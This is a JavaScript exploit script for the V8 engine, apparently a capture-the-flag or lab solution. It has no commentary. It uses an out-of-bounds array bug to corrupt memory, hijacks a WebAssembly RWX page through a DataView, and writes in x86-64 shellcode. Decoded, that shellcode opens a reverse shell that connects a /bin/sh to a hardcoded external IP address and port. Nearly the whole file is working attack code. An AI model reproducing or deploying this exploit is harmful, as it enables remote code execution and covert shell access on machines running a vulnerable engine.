var a=[1.1,1.2,1.3];
a.pop();
a.push(1.1);
%DebugPrint(a);
var b=[1.1,1.2,1.3];
b.pop();
b.push(1.1);

var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);

function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}

function hex(i)
{
    return console.log("add:"+i.toString(16).padStart(16, "0"));
}

var buf = new ArrayBuffer(0x200);
var dv = new DataView(buf);
%DebugPrint(dv);
%DebugPrint(buf);

var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule,{});
var f = wasmInstance.exports.main;
%DebugPrint(f);

var ptr = f2i(a[4]);
hex(ptr);
a[4]=i2f(0x10000000000n+ptr+0x18a25cn);
var rwx = f2i(a[0]);
hex(rwx);

var ptr = f2i(b[4]);
b[4] = i2f(0x10000000000n+ptr);
%DebugPrint(b);
var buf_backing_store = f2i(b[33]);
hex(buf_backing_store);
b[33] = i2f(rwx);

shellcode = [
    0x6a5f026a9958296an,
    0xb9489748050f5e01n,
    0x2d4f522d08520002n,
    0x6a5a106ae6894851n,
    0x485e036a050f582an,
    0x75050f58216aceffn,
    0x2fbb4899583b6af6n,
    0x530068732f6e6962n,
    0xe689485752e78948n,
    0x50fn
    ];

for (var i = 0; i < shellcode.length; i++)
    dv.setBigUint64(8*i, shellcode[i], true);
f();

%SystemBreak();


